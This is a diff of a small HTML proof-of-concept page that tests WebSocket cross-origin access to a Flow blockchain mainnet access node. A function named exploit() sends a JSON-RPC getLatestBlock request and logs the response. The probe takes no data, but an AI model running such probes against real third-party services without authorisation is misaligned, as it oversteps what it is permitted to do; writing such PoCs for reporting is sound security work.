@@ -1,43 +1,49 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Flow WS CORS PoC</title>
+  <meta charset="UTF-8">
+  <title>WebSocket CORS PoC</title>
 </head>
 <body>
-  <h3>WebSocket CORS PoC</h3>
-  <button id="run">Open WS</button>
-  <pre id="out"></pre>
+  <h2>WebSocket CORS PoC</h2>
+  <button onclick="exploit()">Open WS & Send Request</button>
+  <pre id="output"></pre>
 
   <script>
-    const out = document.getElementById('out');
-    function log(...t){ out.textContent += t.join(' ') + '\n'; console.log(...t); }
+    function log(msg) {
+      document.getElementById("output").textContent += msg + "\n";
+    }
 
-    document.getElementById('run').addEventListener('click', () => {
-      try {
-        // افتح اتصال WebSocket من نفس origin (ستُرسل قيمة Origin تلقائياً)
-        const ws = new WebSocket('wss://access.mainnet.nodes.flow.com/v1/ws');
+    function exploit() {
+      const ws = new WebSocket("wss://access.mainnet.nodes.flow.com/v1/ws");
 
-        ws.onopen = () => {
-          log('OPEN: connection established');
-          // لو الخادم يرسل رسائل تلقائياً ستظهر هنا
+      ws.onopen = function() {
+        log("OPEN: connection established");
+
+        // 📌 مثال: طلب getLatestBlock (RPC request)
+        const msg = {
+          jsonrpc: "2.0",
+          id: 1,
+          method: "getLatestBlock",
+          params: [{ "is_sealed": true }]
         };
 
-        ws.onmessage = (m) => {
-          log('MSG:', m.data);
-        };
+        ws.send(JSON.stringify(msg));
+        log("SENT: " + JSON.stringify(msg));
+      };
 
-        ws.onerror = (e) => {
-          log('ERROR:', e && e.message ? e.message : e);
-        };
+      ws.onmessage = function(event) {
+        log("RECEIVED: " + event.data);
+      };
 
-        ws.onclose = (c) => {
-          log('CLOSED: code=' + c.code + ' reason=' + c.reason);
-        };
-      } catch (err) {
-        log('Exception: ' + err);
-      }
-    });
+      ws.onerror = function(err) {
+        log("ERROR: " + err);
+      };
+
+      ws.onclose = function() {
+        log("CLOSED: connection closed");
+      };
+    }
   </script>
 </body>
 </html>
